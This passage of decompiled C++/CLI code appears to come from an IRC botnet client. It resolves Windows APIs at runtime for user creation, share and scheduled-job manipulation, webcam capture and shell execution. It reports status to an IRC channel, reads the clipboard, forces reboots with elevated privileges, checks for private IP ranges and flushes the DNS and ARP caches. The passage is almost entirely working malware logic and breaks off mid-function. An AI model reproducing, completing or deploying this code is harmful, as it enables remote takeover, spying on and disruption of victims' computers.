      \u003CModule\u003E.fInternetOpenUrl = (__FnPtr<void* (void*, char*, char*, uint, uint, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D94);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetCrackUrl = (__FnPtr<int (char*, uint, uint, URL_COMPONENTSW*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D95);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetReadFile = (__FnPtr<int (void*, void*, uint, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D96);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetCloseHandle = (__FnPtr<int (void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D97);
      if (\u003CModule\u003E.fInternetGetConnectedState == null || \u003CModule\u003E.fInternetGetConnectedStateEx == null || \u003CModule\u003E.fHttpOpenRequest == null || \u003CModule\u003E.fHttpSendRequest == null || \u003CModule\u003E.fInternetConnect == null || \u003CModule\u003E.fInternetOpen == null || \u003CModule\u003E.fInternetOpenUrl == null || \u003CModule\u003E.fInternetCrackUrl == null || \u003CModule\u003E.fInternetReadFile == null || \u003CModule\u003E.fInternetCloseHandle == null)
        \u003CModule\u003E.nowininet = 1;
      if (\u003CModule\u003E.fInternetOpen != null)
      {
        ref \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CB_W local = ref \u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D98;
        // ISSUE: function pointer call
        \u003CModule\u003E.ih = __calli(\u003CModule\u003E.fInternetOpen)((uint) ref local, (char*) 0, (char*) 0, 0U, (char*) 0);
        if ((IntPtr) \u003CModule\u003E.ih == IntPtr.Zero)
          \u003CModule\u003E.ih = (void*) 0;
      }
    }
    else
    {
      \u003CModule\u003E.nowinineterr = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nowininet = 1;
      \u003CModule\u003E.ih = (void*) 0;
    }
    HINSTANCE__* hinstancePtr4 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D99);
    if ((IntPtr) hinstancePtr4 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fIcmpCreateFile = (__FnPtr<void* ()>) \u003CModule\u003E.GetProcAddress(hinstancePtr4, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D100);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fIcmpCloseHandle = (__FnPtr<int (void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr4, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D101);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fIcmpSendEcho = (__FnPtr<uint (void*, uint, void*, ushort, ip_option_information*, void*, uint, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr4, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D102);
      if (\u003CModule\u003E.fIcmpCreateFile == null || \u003CModule\u003E.fIcmpCloseHandle == null || \u003CModule\u003E.fIcmpSendEcho == null)
        \u003CModule\u003E.noicmp = 1;
    }
    else
    {
      \u003CModule\u003E.noicmperr = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noicmp = 1;
    }
    HINSTANCE__* hinstancePtr5 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D103);
    if ((IntPtr) hinstancePtr5 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetShareAdd = (__FnPtr<uint (char*, uint, byte*, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D104);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetShareDel = (__FnPtr<uint (char*, char*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D105);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetShareEnum = (__FnPtr<uint (char*, uint, byte**, uint, uint*, uint*, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D106);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetScheduleJobAdd = (__FnPtr<uint (char*, byte*, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D107);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetApiBufferFree = (__FnPtr<uint (void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D108);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetRemoteTOD = (__FnPtr<uint (char*, byte**)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D109);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetUserAdd = (__FnPtr<uint (char*, uint, byte*, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D110);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetUserDel = (__FnPtr<uint (char*, char*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D111);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetUserEnum = (__FnPtr<uint (char*, uint, uint, byte**, uint, uint*, uint*, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D112);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetUserGetInfo = (__FnPtr<uint (char*, char*, uint, byte**)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D113);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fNetMessageBufferSend = (__FnPtr<uint (char*, char*, char*, byte*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr5, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D114);
      if (\u003CModule\u003E.fNetShareAdd == null || \u003CModule\u003E.fNetShareDel == null || \u003CModule\u003E.fNetShareEnum == null || \u003CModule\u003E.fNetScheduleJobAdd == null || \u003CModule\u003E.fNetApiBufferFree == null || \u003CModule\u003E.fNetRemoteTOD == null || \u003CModule\u003E.fNetUserAdd == null || \u003CModule\u003E.fNetUserDel == null || \u003CModule\u003E.fNetUserEnum == null || \u003CModule\u003E.fNetUserGetInfo == null || \u003CModule\u003E.fNetMessageBufferSend == null)
        \u003CModule\u003E.nonetapi32 = 1;
    }
    else
    {
      \u003CModule\u003E.nonetapi32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nonetapi32 = 1;
    }
    HINSTANCE__* hinstancePtr6 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D115);
    if ((IntPtr) hinstancePtr6 != IntPtr.Zero)
    {
      \u003CModule\u003E.fDnsFlushResolverCache = \u003CModule\u003E.GetProcAddress(hinstancePtr6, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D116);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDnsFlushResolverCacheEntry_A = (__FnPtr<int (sbyte*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr6, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D117);
      if (\u003CModule\u003E.fDnsFlushResolverCache == null || \u003CModule\u003E.fDnsFlushResolverCacheEntry_A == null)
        \u003CModule\u003E.nodnsapi = 1;
    }
    else
    {
      \u003CModule\u003E.nodnsapierr = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nodnsapi = 1;
    }
    HINSTANCE__* hinstancePtr7 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D118);
    if ((IntPtr) hinstancePtr7 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetIpNetTable = (__FnPtr<uint (_MIB_IPNETTABLE*, uint*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr7, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D119);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDeleteIpNetEntry = (__FnPtr<uint (_MIB_IPNETROW_LH*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr7, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D120);
      if (\u003CModule\u003E.fGetIpNetTable == null || \u003CModule\u003E.fDeleteIpNetEntry == null)
        \u003CModule\u003E.noiphlpapi = 1;
    }
    else
    {
      \u003CModule\u003E.noiphlpapierr = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noiphlpapi = 1;
    }
    HINSTANCE__* hinstancePtr8 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D121);
    if ((IntPtr) hinstancePtr8 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWNetAddConnection2 = (__FnPtr<uint (_NETRESOURCEW*, char*, char*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr8, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D122);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWNetAddConnection2W = (__FnPtr<uint (_NETRESOURCEW*, char*, char*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr8, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D123);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWNetCancelConnection2 = (__FnPtr<uint (char*, uint, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr8, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D124);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWNetCancelConnection2W = (__FnPtr<uint (char*, uint, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr8, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D125);
      if (\u003CModule\u003E.fWNetAddConnection2 == null || \u003CModule\u003E.fWNetAddConnection2W == null || \u003CModule\u003E.fWNetCancelConnection2 == null || \u003CModule\u003E.fWNetCancelConnection2W == null)
        \u003CModule\u003E.nompr = 1;
    }
    else
    {
      \u003CModule\u003E.nomprerr = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nompr = 1;
    }
    HINSTANCE__* hinstancePtr9 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D126);
    if ((IntPtr) hinstancePtr9 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fShellExecute = (__FnPtr<HINSTANCE__* (HWND__*, char*, char*, char*, char*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr9, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D127);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSHChangeNotify = (__FnPtr<void (int, uint, void*, void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr9, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D128);
      if (\u003CModule\u003E.fShellExecute == null || \u003CModule\u003E.fSHChangeNotify == null)
        \u003CModule\u003E.noshell32 = 1;
    }
    else
    {
      \u003CModule\u003E.noshell32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noshell32 = 1;
    }
    HINSTANCE__* hinstancePtr10 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D129);
    if ((IntPtr) hinstancePtr10 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLDriverConnect = (__FnPtr<short (void*, HWND__*, byte*, short, byte*, short, short*, ushort)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D130);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLSetEnvAttr = (__FnPtr<short (void*, int, void*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D131);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLExecDirect = (__FnPtr<short (void*, byte*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D132);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLAllocHandle = (__FnPtr<short (short, void*, void**)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D133);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLFreeHandle = (__FnPtr<short (short, void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D134);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSQLDisconnect = (__FnPtr<short (void*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr10, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D135);
      if (\u003CModule\u003E.fSQLDriverConnect == null || \u003CModule\u003E.fSQLSetEnvAttr == null || \u003CModule\u003E.fSQLExecDirect == null || \u003CModule\u003E.fSQLAllocHandle == null || \u003CModule\u003E.fSQLFreeHandle == null || \u003CModule\u003E.fSQLDisconnect == null)
        \u003CModule\u003E.noodbc32 = 1;
    }
    else
    {
      \u003CModule\u003E.noodbc32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noodbc32 = 1;
    }
    HINSTANCE__* hinstancePtr11 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D136);
    if ((IntPtr) hinstancePtr11 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fcapCreateCaptureWindow = (__FnPtr<HWND__* (sbyte*, uint, int, int, int, int, HWND__*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr11, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D137);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fcapGetDriverDescription = (__FnPtr<int (ushort, sbyte*, int, sbyte*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr11, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D138);
      if (\u003CModule\u003E.fcapCreateCaptureWindow == null || \u003CModule\u003E.fcapGetDriverDescription == null)
        \u003CModule\u003E.noavicap32 = 1;
    }
    else
    {
      \u003CModule\u003E.noavicap32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noavicap32 = 1;
    }
    return 1;
  }

  internal static unsafe void CheckDLLs(uint sock, sbyte* chan, int notice, int silent)
  {
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
    if (\u003CModule\u003E.nokernel32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D139, __arglist ((int) \u003CModule\u003E.nokernel32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nouser32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D140, __arglist ((int) \u003CModule\u003E.nouser32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noadvapi32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D141, __arglist ((int) \u003CModule\u003E.noadvapi32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nogdi32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D142, __arglist ((int) \u003CModule\u003E.nogdi32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nows2_32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D143, __arglist ((int) \u003CModule\u003E.nows2_32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nowininet != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D144, __arglist ((int) \u003CModule\u003E.nowinineterr));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noicmp != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D145, __arglist ((int) \u003CModule\u003E.noicmperr));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nonetapi32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D146, __arglist ((int) \u003CModule\u003E.nonetapi32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nodnsapi != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D147, __arglist ((int) \u003CModule\u003E.nodnsapierr));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noiphlpapi != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D148, __arglist ((int) \u003CModule\u003E.noiphlpapierr));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.nompr != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D149, __arglist ((int) \u003CModule\u003E.nomprerr));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noshell32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D150, __arglist ((int) \u003CModule\u003E.noshell32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noodbc32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D151, __arglist ((int) \u003CModule\u003E.noodbc32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    if (\u003CModule\u003E.noavicap32 != 0)
    {
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D152, __arglist ((int) \u003CModule\u003E.noavicap32err));
      \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
    }
    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D153, __arglist ());
    if (silent != 0)
      return;
    \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
  }

  internal static unsafe int Split(sbyte* inStr, void* saveArray)
  {
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040PAD arrayTypeBy0CaaPad;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0CaaPad, 0, 2048U);
    int num1 = (int) \u003CModule\u003E.strlen(inStr);
    if (num1 < 1)
      return -1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref arrayTypeBy0CaaPad = (int) inStr;
    int num2 = 1;
    int index = 0;
    if (0 < num1)
    {
      do
      {
        switch (inStr[index])
        {
          case 10:
          case 13:
            inStr[index] = (sbyte) 0;
            break;
        }
        ++index;
      }
      while (index < num1);
    }
    int num3 = 0;
    if (0 < num1)
    {
      do
      {
        if (*(sbyte*) (num3 + (IntPtr) inStr) == (sbyte) 0)
        {
          int num4 = (int) (inStr + num3 + 1);
          if (*(sbyte*) num4 != (sbyte) 0)
          {
            if (num2 < 512)
            {
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              ^(int&) (num2 * 4 + (IntPtr) &arrayTypeBy0CaaPad) = num4;
              ++num2;
            }
            else
              break;
          }
        }
        ++num3;
      }
      while (num3 < num1);
    }
    if ((IntPtr) saveArray != IntPtr.Zero)
      \u003CModule\u003E.memcpy(saveArray, (void*) &arrayTypeBy0CaaPad, 2048U);
    return num2;
  }

  internal static unsafe sbyte* replacestr(sbyte* str, sbyte* substr, sbyte* repstr)
  {
    sbyte* numPtr1 = (sbyte*) 0;
    if ((IntPtr) str == IntPtr.Zero || (IntPtr) substr == IntPtr.Zero || (IntPtr) repstr == IntPtr.Zero || *substr == (sbyte) 0)
      return (sbyte*) 0;
    sbyte* numPtr2 = \u003CModule\u003E.strdup(str);
    if ((IntPtr) numPtr2 != IntPtr.Zero)
    {
      numPtr1 = \u003CModule\u003E.strstr(str, substr);
      if ((IntPtr) numPtr1 != IntPtr.Zero)
      {
        \u003CModule\u003E.strncpy(numPtr2, str, (uint) ((IntPtr) numPtr1 - (IntPtr) str));
        *(sbyte*) ((IntPtr) numPtr2 - (IntPtr) str + (IntPtr) numPtr1) = (sbyte) 0;
        sbyte* numPtr3 = numPtr2;
        sbyte* numPtr4 = repstr;
        int num = (int) \u003CModule\u003E.strlen(numPtr4);
        \u003CModule\u003E.strncat(numPtr3, numPtr4, (uint) num);
        \u003CModule\u003E.strcat(numPtr2, (sbyte*) ((int) \u003CModule\u003E.strlen(substr) + (IntPtr) numPtr1));
        \u003CModule\u003E.strcpy(str, numPtr2);
        numPtr1 = str;
      }
      \u003CModule\u003E.free((void*) numPtr2);
    }
    return numPtr1;
  }

  internal static unsafe int Reboot()
  {
    \u003CModule\u003E.AdjustPrivileges((char*) &\u003CModule\u003E.\u003FA0x5e48b7d6\u002Eunnamed\u002Dglobal\u002D0, 1);
    // ISSUE: function pointer call
    return __calli(\u003CModule\u003E.fExitWindowsEx)(6U, 327685U) != 0 ? 1 : 0;
  }

  internal static unsafe sbyte* GetClipboardText()
  {
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fOpenClipboard)((HWND__*) 0) == 0)
      return (sbyte*) 0;
    // ISSUE: function pointer call
    void* voidPtr = __calli(\u003CModule\u003E.fGetClipboardData)(1U);
    if ((IntPtr) voidPtr == IntPtr.Zero)
      return (sbyte*) 0;
    void* clipboardText = \u003CModule\u003E.GlobalLock(voidPtr);
    \u003CModule\u003E.GlobalUnlock(voidPtr);
    // ISSUE: function pointer call
    int num = __calli(\u003CModule\u003E.fCloseClipboard)();
    return (sbyte*) clipboardText;
  }

  internal static unsafe int PrivateIP(sbyte* ip)
  {
    if ((IntPtr) ip != IntPtr.Zero && \u003CModule\u003E.strcmp(ip, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D0) != 0)
    {
      \u0024ArrayType\u0024\u0024\u0024BY0CA\u0040D arrayTypeBy0CaD;
      \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0CaD, ip, 32U);
      sbyte* numPtr1 = \u003CModule\u003E.strtok((sbyte*) &arrayTypeBy0CaD, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D1);
      if ((IntPtr) numPtr1 != IntPtr.Zero)
      {
        int num1 = \u003CModule\u003E.atoi(numPtr1);
        sbyte* numPtr2 = \u003CModule\u003E.strtok((sbyte*) 0, (sbyte*) &\u003CModule\u003E.\u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D2);
        if ((IntPtr) numPtr2 != IntPtr.Zero)
        {
          int num2 = \u003CModule\u003E.atoi(numPtr2);
          switch (num1)
          {
            case 10:
              return 1;
            case 172:
              if (num2 > 15)
              {
                if (num2 < 32)
                  goto case 10;
                else
                  goto default;
              }
              else
                break;
            default:
              if (num1 != 192 || num2 != 168)
                break;
              goto case 10;
          }
        }
      }
    }
    return 0;
  }

  internal static unsafe uint ResolveAddress(sbyte* szHost)
  {
    sbyte* numPtr1 = szHost;
    // ISSUE: function pointer call
    uint num = __calli(\u003CModule\u003E.finet_addr)(numPtr1);
    if (num == uint.MaxValue)
    {
      sbyte* numPtr2 = szHost;
      // ISSUE: function pointer call
      hostent* hostentPtr = __calli(\u003CModule\u003E.fgethostbyname)(numPtr2);
      if ((IntPtr) hostentPtr == IntPtr.Zero)
        return uint.MaxValue;
      num = (uint) *(int*) *(int*) *(int*) ((IntPtr) hostentPtr + 12);
    }
    return num;
  }

  internal static int FlushDNSCache() => \u003CModule\u003E.fDnsFlushResolverCache == null ? 0 : __calli(\u003CModule\u003E.fDnsFlushResolverCache)();

  internal static unsafe int FlushARPCache()
  {
    _MIB_IPNETTABLE* mibIpnettablePtr1 = (_MIB_IPNETTABLE*) 0;
    uint num1 = 0;
    int num2 = 1;
    ref uint local1 = ref num1;
    // ISSUE: function pointer call
    uint num3 = __calli(\u003CModule\u003E.fGetIpNetTable)(0, (uint*) ref local1, (_MIB_IPNETTABLE*) 1);
    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D arrayTypeBy0IaD;
    switch (num3)
    {
      case 0:
        uint num4 = 0;
        if (0U < (uint) *(int*) mibIpnettablePtr1)
        {
          _MIB_IPNETTABLE* mibIpnettablePtr2 = (_MIB_IPNETTABLE*) ((IntPtr) mibIpnettablePtr1 + 4);
          do
          {
            _MIB_IPNETTABLE* mibIpnettablePtr3 = mibIpnettablePtr2;
            // ISSUE: function pointer call
